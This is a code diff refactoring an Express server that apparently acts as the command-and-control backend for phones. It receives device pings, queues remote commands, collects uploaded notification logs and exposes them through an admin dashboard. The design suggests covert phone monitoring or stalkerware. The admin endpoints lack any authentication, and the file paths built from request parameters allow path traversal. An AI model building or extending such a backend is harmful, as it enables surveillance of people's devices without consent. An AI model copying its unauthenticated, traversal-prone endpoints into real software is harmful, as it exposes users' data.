@@ -17,23 +17,15 @@ app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(express.static(__dirname));
 
-// Global object sabhi devices ka data aur commands store karne ke liye
 let devices = {}; 
 
-// ==================================================
-// 📲 PHONE SIDE (App se data aana)
-// ==================================================
-
+// 📲 PHONE SIDE
 app.post('/api/status', (req, res) => {
     const { device_id, model, battery, version, charging } = req.body; 
-    
-    // Agar app se ID nahi aayi toh process na karein
     if (!device_id) return res.status(400).json({ error: "No Device ID" });
 
-    // 1. Purana command dhoondo (agar koi pending hai)
     const pendingCommand = (devices[device_id] && devices[device_id].command) ? devices[device_id].command : "none";
 
-    // 2. Device ka naya data update karo
     devices[device_id] = {
         id: device_id,
         model: model || "Unknown",
@@ -41,34 +33,58 @@ app.post('/api/status', (req, res) => {
         version: version || "--",
         charging: charging === 'true' || charging === true,
         lastSeen: Date.now(),
-        command: "none" // Command bhejte hi server se clear kar do
+        command: "none" 
     };
 
-    console.log(`📡 Ping from ID: ${device_id} | Battery: ${battery}% | Cmd Sent: ${pendingCommand}`);
-    
-    // App ko command bhej do (Silent/Normal etc.)
     res.json({ status: "success", command: pendingCommand });
+});
+
+// 💻 DASHBOARD SIDE - YEH MISSING THA
+app.get('/api/device-status/:id', (req, res) => {
+    const deviceId = req.params.id;
+    const device = devices[deviceId];
+    
+    if (!device) {
+        return res.json({ isOnline: false });
+    }
+    
+    // Agar pichle 1 minute mein phone ka ping aaya hai toh Online
+    const isOnline = (Date.now() - device.lastSeen) < 60000; 
+    res.json({ ...device, isOnline });
+});
+
+app.get('/api/admin/all-devices', (req, res) => {
+    res.json(devices);
+});
+
+app.post('/api/send-command', (req, res) => {
+    const { device_id, command } = req.body;
+    if (!devices[device_id]) {
+        devices[device_id] = { id: device_id };
+    }
+    devices[device_id].command = command;
+    res.json({ status: "success" });
+});
+
+app.get('/api/get-data/:device_id/:type', (req, res) => {
+    const { device_id, type } = req.params;
+    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);
+    if (fs.existsSync(filePath)) res.sendFile(filePath);
+    else res.json([]); 
 });
 
 app.post('/api/upload_data', (req, res) => {
     const { device_id, type, data } = req.body;
     if (!device_id) return res.status(400).json({ error: "No ID" });
-
-    console.log(`📥 Data Received: [${type}] from ${device_id}`);
-
     let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
-    const fileName = `${device_id}_${type}.json`;
-    const filePath = path.join(UPLOADS_DIR, fileName);
+    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);
 
     try {
         let finalData;
         if (type === 'notifications') {
             let existingData = [];
             if (fs.existsSync(filePath)) {
-                try {
-                    const content = fs.readFileSync(filePath, 'utf8');
-                    existingData = JSON.parse(content);
-                } catch (e) { existingData = []; }
+                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
             }
             if (!Array.isArray(existingData)) existingData = [];
             existingData.unshift(parsedData); 
@@ -76,48 +92,11 @@ app.post('/api/upload_data', (req, res) => {
         } else {
             finalData = parsedData;
         }
-
         fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
         res.json({ status: "success" });
     } catch (error) {
-        console.error("Save Error:", error);
         res.status(500).json({ status: "error" });
     }
 });
 
-// ==================================================
-// 💻 DASHBOARD SIDE (Admin Panel)
-// ==================================================
-
-// Dashboard ko saare devices ki list dikhane ke liye
-app.get('/api/admin/all-devices', (req, res) => {
-    res.json(devices);
-});
-
-app.post('/api/send-command', (req, res) => {
-    const { device_id, command } = req.body;
-
-    if (!devices[device_id]) {
-        // Agar device abhi tak ping nahi kiya toh temporary memory banao
-        devices[device_id] = { id: device_id };
-    }
-    
-    devices[device_id].command = command;
-    console.log(`🚀 Command [${command}] queued for ID: ${device_id}`);
-    res.json({ status: "success" });
-});
-
-app.get('/api/get-data/:device_id/:type', (req, res) => {
-    const { device_id, type } = req.params;
-    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);
-
-    if (fs.existsSync(filePath)) {
-        res.sendFile(filePath);
-    } else {
-        res.json([]); 
-    }
-});
-
-app.listen(PORT, () => {
-    console.log(`🔥 CYBER-SERVER RUNNING ON PORT ${PORT}`);
-});
+app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
